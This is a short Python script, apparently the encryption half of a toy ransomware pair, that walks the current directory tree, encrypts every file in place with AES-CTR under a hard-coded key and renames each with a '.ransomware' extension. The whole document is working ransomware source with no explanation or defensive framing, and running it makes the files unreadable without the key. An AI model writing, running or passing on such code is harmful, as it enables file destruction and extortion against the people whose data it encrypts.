import os
import pyaes

for root, dir, files in os.walk("./"):
    for f in files:
        if f != "decrypt.py" and f != "encrypt.py" and f.split(".")[-1] != "ransomware":
            name = os.path.join(root, f)

            with open(name, "rb") as file:
                file_data = file.read()

            key = b"secretencryptkey"
            aes = pyaes.AESModeOfOperationCTR(key)

            data_encrypt = aes.encrypt(file_data)

            with open(name, "wb") as file:
                file.write(data_encrypt)

            os.rename(name, f"{name}.ransomware")
